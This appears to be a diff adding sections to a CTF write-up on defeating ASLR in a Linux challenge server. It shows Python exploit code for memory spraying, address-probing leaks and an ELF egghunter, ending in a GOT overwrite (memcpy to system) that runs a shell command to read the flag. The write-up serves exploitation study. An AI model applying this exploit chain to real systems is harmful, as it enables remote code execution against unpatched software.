@@ -130,6 +130,7 @@ int main()
 }
 ```
 
+### Boundary cross trick
 If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.
 
 | mem | 16tb boundary cross?
@@ -512,11 +513,324 @@ We can completely control the size of the decompressed file, and we get an mmap 
 
 In my exploit i used the `isAddrMapped` function, and changed the filelen.
 
-For example, to allocate a contiguous memory chunk of a given size, you can do:
+For example, let's try to allocate a contiguous chunk of size = 0x4000000 = 64mb
 ```py
-isAddrMapped(IN_ADDR, i, size)
+isAddrMapped(IN_ADDR, 0, 0x4000000)
 ```
+
+That's the result:
+```
+root@088ec31b2ce9:/home/ctf/challenge# cat /proc/47/maps
+...
+7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+...
+```
+
+If you try do it again:
+```py
+isAddrMapped(IN_ADDR, 0, 0x4000000)
+isAddrMapped(IN_ADDR, 0, 0x4000000)
+```
+
+That's the result:
+```
+7f344c000000-7f3450000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
+7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+```
+
+Nice! Multiple allocations won't have gaps.
 
 ## 4.4 How much memory to spray?
 
-The ideal case is to reproduce my PoC
+As you can see from [this poc](#poc-of-aslr-bypass-on-linux), the ideal size for the contiguous mapped memory would be 16TB.
+
+Unfortunately, if you try to allocate 16TB of memory on the remote server, the mmap will fail, because [nsjail limit this](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64#21-initial-foothold).
+
+After some trial and error I found out that I can spray ~3840mb of memory, with this code:
+
+```py
+size =    0x000004000000
+for i in range(0, 60):
+    print ('.', end='')
+    isAddrMapped(IN_ADDR, i, size)
+```
+
+the result memory mappings will be something like this:
+
+### Memory Spray result
+```
+root@088ec31b2ce9:/home/ctf/challenge# cat /proc/`pgrep flag_server-exe`/maps
+...
+
+7fe2dc000000-7fe2e0000000 r--p 00000000 00:af 121                        /challenge/files/59.unkyle
+7fe2e0000000-7fe2e4000000 r--p 00000000 00:af 119                        /challenge/files/58.unkyle
+7fe2e4000000-7fe2e8000000 r--p 00000000 00:af 117                        /challenge/files/57.unkyle
+7fe2e8000000-7fe2ec000000 r--p 00000000 00:af 115                        /challenge/files/56.unkyle
+7fe2ec000000-7fe2f0000000 r--p 00000000 00:af 113                        /challenge/files/55.unkyle
+7fe2f0000000-7fe2f4000000 r--p 00000000 00:af 111                        /challenge/files/54.unkyle
+7fe2f4000000-7fe2f8000000 r--p 00000000 00:af 109                        /challenge/files/53.unkyle
+7fe2f8000000-7fe2fc000000 r--p 00000000 00:af 107                        /challenge/files/52.unkyle
+7fe2fc000000-7fe300000000 r--p 00000000 00:af 105                        /challenge/files/51.unkyle
+7fe300000000-7fe304000000 r--p 00000000 00:af 103                        /challenge/files/50.unkyle
+7fe304000000-7fe308000000 r--p 00000000 00:af 101                        /challenge/files/49.unkyle
+7fe308000000-7fe30c000000 r--p 00000000 00:af 99                         /challenge/files/48.unkyle
+7fe30c000000-7fe310000000 r--p 00000000 00:af 97                         /challenge/files/47.unkyle
+7fe310000000-7fe314000000 r--p 00000000 00:af 95                         /challenge/files/46.unkyle
+7fe314000000-7fe318000000 r--p 00000000 00:af 93                         /challenge/files/45.unkyle
+7fe318000000-7fe31c000000 r--p 00000000 00:af 91                         /challenge/files/44.unkyle
+7fe31c000000-7fe320000000 r--p 00000000 00:af 89                         /challenge/files/43.unkyle
+7fe320000000-7fe324000000 r--p 00000000 00:af 87                         /challenge/files/42.unkyle
+7fe324000000-7fe328000000 r--p 00000000 00:af 85                         /challenge/files/41.unkyle
+7fe328000000-7fe32c000000 r--p 00000000 00:af 83                         /challenge/files/40.unkyle
+7fe32c000000-7fe330000000 r--p 00000000 00:af 81                         /challenge/files/39.unkyle
+7fe330000000-7fe334000000 r--p 00000000 00:af 79                         /challenge/files/38.unkyle
+7fe334000000-7fe338000000 r--p 00000000 00:af 77                         /challenge/files/37.unkyle
+7fe338000000-7fe33c000000 r--p 00000000 00:af 75                         /challenge/files/36.unkyle
+7fe33c000000-7fe340000000 r--p 00000000 00:af 73                         /challenge/files/35.unkyle
+7fe340000000-7fe344000000 r--p 00000000 00:af 71                         /challenge/files/34.unkyle
+7fe344000000-7fe348000000 r--p 00000000 00:af 69                         /challenge/files/33.unkyle
+7fe348000000-7fe34c000000 r--p 00000000 00:af 67                         /challenge/files/32.unkyle
+7fe34c000000-7fe350000000 r--p 00000000 00:af 65                         /challenge/files/31.unkyle
+7fe350000000-7fe354000000 r--p 00000000 00:af 63                         /challenge/files/30.unkyle
+7fe354000000-7fe358000000 r--p 00000000 00:af 61                         /challenge/files/29.unkyle
+7fe358000000-7fe35c000000 r--p 00000000 00:af 59                         /challenge/files/28.unkyle
+7fe35c000000-7fe360000000 r--p 00000000 00:af 57                         /challenge/files/27.unkyle
+7fe360000000-7fe364000000 r--p 00000000 00:af 55                         /challenge/files/26.unkyle
+7fe364000000-7fe368000000 r--p 00000000 00:af 53                         /challenge/files/25.unkyle
+7fe368000000-7fe36c000000 r--p 00000000 00:af 51                         /challenge/files/24.unkyle
+7fe36c000000-7fe370000000 r--p 00000000 00:af 49                         /challenge/files/23.unkyle
+7fe370000000-7fe374000000 r--p 00000000 00:af 47                         /challenge/files/22.unkyle
+7fe374000000-7fe378000000 r--p 00000000 00:af 45                         /challenge/files/21.unkyle
+7fe378000000-7fe37c000000 r--p 00000000 00:af 43                         /challenge/files/20.unkyle
+7fe37c000000-7fe380000000 r--p 00000000 00:af 41                         /challenge/files/19.unkyle
+7fe380000000-7fe384000000 r--p 00000000 00:af 39                         /challenge/files/18.unkyle
+7fe384000000-7fe388000000 r--p 00000000 00:af 37                         /challenge/files/17.unkyle
+7fe388000000-7fe38c000000 r--p 00000000 00:af 35                         /challenge/files/16.unkyle
+7fe38c000000-7fe390000000 r--p 00000000 00:af 33                         /challenge/files/15.unkyle
+7fe390000000-7fe394000000 r--p 00000000 00:af 31                         /challenge/files/14.unkyle
+7fe394000000-7fe398000000 r--p 00000000 00:af 29                         /challenge/files/13.unkyle
+7fe398000000-7fe39c000000 r--p 00000000 00:af 27                         /challenge/files/12.unkyle
+7fe39c000000-7fe3a0000000 r--p 00000000 00:af 25                         /challenge/files/11.unkyle
+7fe3a0000000-7fe3a0021000 rw-p 00000000 00:00 0
+7fe3a0021000-7fe3a4000000 ---p 00000000 00:00 0
+7fe3a4000000-7fe3a8000000 r--p 00000000 00:af 23                         /challenge/files/10.unkyle
+7fe3a8000000-7fe3ac000000 r--p 00000000 00:af 21                         /challenge/files/9.unkyle
+7fe3ac000000-7fe3b0000000 r--p 00000000 00:af 19                         /challenge/files/8.unkyle
+7fe3b0000000-7fe3b4000000 r--p 00000000 00:af 17                         /challenge/files/7.unkyle
+7fe3b4000000-7fe3b8000000 r--p 00000000 00:af 15                         /challenge/files/6.unkyle
+7fe3b8000000-7fe3bc000000 r--p 00000000 00:af 13                         /challenge/files/5.unkyle
+7fe3bc000000-7fe3c0000000 r--p 00000000 00:af 11                         /challenge/files/4.unkyle
+7fe3c0000000-7fe3c4000000 r--p 00000000 00:af 9                          /challenge/files/3.unkyle
+7fe3c4000000-7fe3c8000000 r--p 00000000 00:af 7                          /challenge/files/2.unkyle
+7fe3c8000000-7fe3cc000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
+7fe3cc000000-7fe3d0000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+7fe3d0000000-7fe3d01a8000 rw-p 00000000 00:00 0
+7fe3d01a8000-7fe3d4000000 ---p 00000000 00:00 0
+
+...
+
+```
+
+Let's focus our attention on the addresses created with the memory spraying. \(*.unkyle files \)
+
+We can try to apply the [boundary cross trick](#Boundary-cross-trick).
+
+| mem | 4gb boundary cross?
+| - |-
+| 7fe2dc000000 | No
+| 7fe2e0000000 | No
+| 7fe2e4000000 | No
+| 7fe2e8000000 | No
+| 7fe2ec000000 | No
+| 7fe2f0000000 | No
+| 7fe2f4000000 | No
+| 7fe2f8000000 | No
+| 7fe2fc000000 | No
+| 7fe300000000 | Yes
+| 7fe304000000 | Yes
+| 7fe308000000 | Yes
+By exploiting the change from 7fe2.. to 7fe3.. we can scan memory with a step of 0x100000000 = 4gb memory.
+
+## 4.5 Finally defeating ASLR 
+
+Given that step size, we can scan `start=0x7f0000000000` to `end=0x800000000000` with only `end - start / size` = 256 queries.
+
+```py
+start = 0x7f0000000000
+end = 0x800000000000 
+step = 0x100000000 # 4gb
+
+isMapped = False
+j = 0xff
+while isMapped == False:
+    leakAddr = start + j*step
+    isMapped = (isAddrMapped(leakAddr, 1000 + j))
+    j -= 1
+```
+
+At this point, we have `leakAddr` which is a mapped address like this: `0x7fXX00000000`, in [this](Memory-Spray-result) case, `leakAddr = 0x7fe300000000`. 
+
+Now, if we want to follow the saelo technique, we should do a binary search of the range 0x7fXX00000000 - 0x7fXXffffffff, in order to find lower and upper bounds, the problem is that there are some holes in that range, so the binary search fails a lot of times.
+
+You can check yourself with [this](resources/analyze-mappings.py) script:
+```
+RANGE					SIZE
+
+0x00007f7544000000 - 0x00007f763c000000	0xf8000000
+SMALL GAP				0x00caa000
+0x00007f763ccaa000 - 0x00007f763e358000	0x016ae000
+```
+
+That small gap between 0x00007f763c000000 and 0x00007f763ccaa000 screws up the binary search, of course it is still doable, but i found an easier way.
+
+### Observation
+
+We want to get the last mapped address, because that's where libraries are mapped.
+
+For example, given those mappings for the libraries:
+```
+7fe3d6a1e000-7fe3d6a1f000 r--p 00000000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a1f000-7fe3d6a20000 r-xp 00001000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a20000-7fe3d6a21000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a21000-7fe3d6a22000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a22000-7fe3d6a23000 rw-p 00003000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a23000-7fe3d6a25000 rw-p 00000000 00:00 0
+7fe3d6a25000-7fe3d6a26000 r--p 00000000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a26000-7fe3d6a4d000 r-xp 00001000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a4d000-7fe3d6a57000 r--p 00028000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a57000-7fe3d6a59000 r--p 00031000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a59000-7fe3d6a5b000 rw-p 00033000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+```
+
+We can search for the address `7fe3d6a5b000 - 0x1000` with this trick:
+
+| address | isAddressMapped? |
+| - | - |
+0x7fe3f0000000    |    No
+0x7fe3e0000000    |    No
+0x7fe3d0000000    |    Yes
+0x7fe3df000000    |    No
+0x7fe3de000000    |    No
+0x7fe3dd000000    |    No
+0x7fe3dc000000    |    No
+0x7fe3db000000    |    No
+0x7fe3da000000    |    No
+0x7fe3d9000000    |    No
+0x7fe3d8000000    |    No
+0x7fe3d7000000    |    No
+0x7fe3d6000000    |    Yes
+0x7fe3d6f00000    |    No
+0x7fe3d6e00000    |    No
+0x7fe3d6d00000    |    No
+0x7fe3d6c00000    |    No
+0x7fe3d6b00000    |    No
+0x7fe3d6a00000    |    Yes
+0x7fe3d6af0000    |    No
+0x7fe3d6ae0000    |    No
+0x7fe3d6ad0000    |    No
+0x7fe3d6ac0000    |    No
+0x7fe3d6ab0000    |    No
+0x7fe3d6aa0000    |    No
+0x7fe3d6a90000    |    No
+0x7fe3d6a80000    |    No
+0x7fe3d6a70000    |    No
+0x7fe3d6a60000    |    No
+0x7fe3d6a50000    |    Yes
+0x7fe3d6a5f000    |    No
+0x7fe3d6a5e000    |    No
+0x7fe3d6a5d000    |    No
+0x7fe3d6a5c000    |    No
+0x7fe3d6a5b000    |    No
+0x7fe3d6a5a000    |    Yes
+
+`lastMappedPage = 0x7fe3d6a5a000`
+
+We are bruteforcing half byte at a time, for a worst case scenario of 16*5 = 80 queries.
+
+```py
+def linearFindLargest(base, increment, idstart):
+    for i in range(0, 16)[::-1]:
+        print (f"{base + increment*i:#x}", end='\t|\t')
+        if isAddrMapped(base + increment*i, idstart+i):
+            print ('Yes')
+            return i*increment
+        print ('No')
+    raise Exception("find_largest should not fail")
+  
+# Find upper bound, we can't do a binary search because there are some holes which
+# screw things up
+lastMappedPage = leakAddr
+lastMappedPage += linearFindLargest(lastMappedPage, 0x10000000, 40000)
+lastMappedPage += linearFindLargest(lastMappedPage, 0x1000000, 40100)
+lastMappedPage += linearFindLargest(lastMappedPage, 0x100000, 40200)
+lastMappedPage += linearFindLargest(lastMappedPage, 0x10000, 40300)
+lastMappedPage += linearFindLargest(lastMappedPage, 0x1000, 40400)
+print (f"{lastMappedPage = :#x}")
+```
+
+## 4.6 The exploit
+
+Finally, we know everything we need about the memory mappings, now it is just a matter of leveraging a write what where primitive into code execution.
+
+To achieve code execution I overwrote libkayle.so's memcpy@got entry with system@libc.
+
+### Get libkayle base
+Luckily for us libc base and libkayle.so base are at a constant offset from the lastMappedPage, I didn't know that was the case so I wrote a egghunter which search for `\x7fELF` \(Header of ELF executables\), which in the end wasn't useful.
+```
+    # Scan backwards looking for b'\x7fELF'
+    i = 0
+    numElf = 0
+
+    while numElf != 2:
+        theAddr = lastMappedPage-0x1000*i
+        hdr = readFromAddr(theAddr, 4, 40500+i)
+        print(f"{i:02d}) Elf in {theAddr:#x}? {hdr.hex()}")
+        if hdr == b'\x7fELF':
+            numElf += 1
+            print (f"found elf at {theAddr:#x}")
+
+        if i > 70:
+            print ("Exploit failed, upper bound address was wrong")
+            exit(1)
+
+        i += 1
+```
+
+### Overwrite libkayle's memcpy@got and get RCE
+
+Fortunately overwriting memcpy@got with system was good enough to get the flag and claim that juicy bounty :)
+
+```py
+    # exp is a CompressedFile which:
+    # - writes libc.system to memcpy_got
+    # - calls memcpy(cmd, 0, 0) -> system(cmd)
+    cmd = b"ls;cat flag.txt;\x00"
+    exp = CompressedFile(24)
+    
+    exp.seek((memcpy_got - OUT_ADDR)&M64)
+    # out=memcpy_got
+    for b in p64(libc.symbols['system']):
+        exp.write(bytes([b]))
+    # out=memcpy_got+8
+    # memcpy(out, out-off, size)
+    # system(out)
+    
+    in_addr_off = len(exp.content)
+    exp.content += cmd
+    exp.seek((IN_ADDR + in_addr_off - (memcpy_got + 8))&M64)
+    exp.memcpy(0, 0) # system(cmd)
+    
+    uploadFile(exp.content, 123001)
+    # profit
+    getFile(123001)
+```
+
+## 4.7 The flag!
+
+You can find the exploit [here](resources/x.py).
+
+<p align="center"><img src="./images/exploit-final.png"></p><br/>
+
+## 5. Conclusion
+
+Hope you enjoyed the writeup, if something was not clear enough don't hesitate to contact me [@nick0ve](https://twitter.com/nick0ve) :)
